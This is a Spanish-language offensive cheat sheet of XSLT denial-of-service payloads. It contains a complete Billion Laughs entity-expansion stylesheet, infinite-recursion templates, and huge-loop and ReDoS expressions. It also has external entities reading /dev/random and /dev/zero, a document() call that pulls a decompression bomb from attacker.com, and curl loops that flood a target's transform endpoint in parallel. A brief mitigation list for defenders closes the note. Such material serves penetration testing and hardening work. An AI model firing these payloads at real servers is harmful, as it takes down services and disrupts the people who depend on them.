---
aliases:
  - XSLT DoS
  - XSLT Billion Laughs
  - XSLT Recursion DoS
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
  - '[[XML External Entity (XXE)]]'
---
# XSLT - DoS

***

## Billion Laughs / Expansión Exponencial

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;..."> ... <!ENTITY lol9 "&lol8;...&lol8;">]><output>&lol9;</output>` | Billion Laughs DTD entity expansion 10⁹ chars | Parser permite DTDs sin limit. |
| `<xsl:variable name="a" select="'A'"/><xsl:variable name="b" select="concat($a,$a,$a,$a,$a,$a,$a,$a,$a,$a)"/><xsl:variable name="c" select="concat($b,$b,$b,$b,$b,$b,$b,$b,$b,$b)"/>...` (chain to f) | XSLT-native variable expansion DoS (no DTDs needed) | DTDs blocked. |
| `<!DOCTYPE z [<!ENTITY x "AAAAAAAAAA...10000 chars">]><doc>&x;&x;&x;...x10000</doc>` | Quadratic blowup single big entity repeated | Single big entity. |
| `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///dev/random">]><doc>&xxe;</doc>` | External entity DoS infinite read | /dev/random hang. |
| `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///dev/zero">]><doc>&xxe;</doc>` | /dev/zero infinite zeros | Memory exhaust. |
| `<xsl:value-of select="document('http://attacker.com/bomb.xml.gz')"/>` (server hosts decompression bomb) | Compressed bomb fetch + decompress | Auto-decompression. |
| `<xsl:variable name="big" select="string-join(for $i in 1 to 100000 return 'AAAAAAAAAAAAAAAAAAAA','')"/>` | string-join 100K x 20 chars | Memory exhaust. |
| `<xsl:variable name="bomb" select="for $i in 1 to 1000000 return concat('Y',$i)"/>` | XPath 2.0+ for sequence 1M items | Sequence DoS. |
| `curl -X POST --data @billion-laughs.xml https://target/transform &` (run async + monitor server CPU) | Send DoS payload async + monitor | Test workflow. |
| `for i in {1..10}; do (curl -X POST --data @bomb.xml https://target/transform &); done; wait` | Parallel bomb requests | Parallel attack. |
^xslt-dos-billion

### Billion Laughs completo

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol  "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&lol9;</output>
  </xsl:template>
</xsl:stylesheet>
```

`&lol9;` = 10⁹ chars = ~1 GB en memoria.

___

## Recursión Infinita / Loops

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<xsl:template name="loop"><xsl:call-template name="loop"/></xsl:template>` con `<xsl:template match="/"><xsl:call-template name="loop"/></xsl:template>` | Self-recursive template stack overflow | Stack overflow. |
| `<xsl:template name="r"><xsl:param name="i"/><xsl:call-template name="r"><xsl:with-param name="i" select="$i + 1"/></xsl:call-template></xsl:template>` | Parameterized recursion sin tail-call optim | Stack overflow no-TCO. |
| `<xsl:for-each select="1 to 999999999"><xsl:value-of select="."/></xsl:for-each>` | 10⁹ iteration loop | Loop DoS XPath 2+. |
| `<xsl:for-each select="1 to 100000"><xsl:for-each select="1 to 100000">x</xsl:for-each></xsl:for-each>` | Nested loop 10¹⁰ ops | Cartesian DoS. |
| `<xsl:value-of select="matches($s, '(a+)+$')"/>` con `$s='aaaaaaaaaaaaaaaaaaaaaaaab'` | ReDoS catastrophic regex | ReDoS. |
| `<xsl:perform-sort select="1 to 9999999"><xsl:sort select="."/></xsl:perform-sort>` | Large-range sort | Sort DoS. |
| `<xsl:template match="*"><xsl:copy><xsl:apply-templates select="."/></xsl:copy></xsl:template>` | Self-apply infinite loop | Apply-template loop. |
| `<xsl:variable name="big"><xsl:for-each select="1 to 999999"><xsl:value-of select="."/></xsl:for-each></xsl:variable>` | Variable buildup big string | Memory variable build. |
| `<xsl:value-of select="string-length(replace($s,'a','aa'))"/>` con `$s` con 1000 `a`s | Exponential string replace | Replace blowup. |
| `<xsl:choose><xsl:when test="document('http://localhost:99999/')">x</xsl:when></xsl:choose>` (invalid port → hang) | document() on invalid port retries hang | Network hang. |
| `for i in {1..100}; do (curl -X POST --data @recursion.xsl https://target/transform &); done; wait` | Parallel DoS recursion | Parallel exhaust. |
^xslt-dos-recursion

### Stylesheet completo recursión infinita

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template name="forever">
    <xsl:call-template name="forever"/>
  </xsl:template>
  <xsl:template match="/">
    <xsl:call-template name="forever"/>
  </xsl:template>
</xsl:stylesheet>
```

### Mitigación defender

- Saxon: `setMessageEmitter` con timeout, `XPathException` budget.
- libxslt: `XSLT_MAX_DEPTH` (default 3000), `XSLT_MAX_VARS`.
- .NET XslCompiledTransform: timeout en host.
- Limitar tiempo de transformación: 1-5s max por proceso transformador.
- Disable DTDs en parser XML: `feature: disallow-doctype-decl = true`.

***
